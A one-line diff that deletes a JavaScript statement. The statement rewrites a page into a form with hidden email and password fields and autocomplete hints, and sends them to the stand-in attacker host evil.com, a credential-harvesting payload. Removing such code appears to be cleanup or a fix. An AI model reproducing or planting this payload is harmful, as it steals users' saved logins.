@@ -1,1 +1,0 @@
-document.body.innerHTML="<form method='get' target='https://evil.com'><input type='email' id='email' name='email' autocomplete='email' placeholder='Enter your email' hidden required><br><br><input type='password' id='password' name='password' autocomplete='current-password' placeholder='Enter your password' hidden required><button type='submit'>click</button></form>"
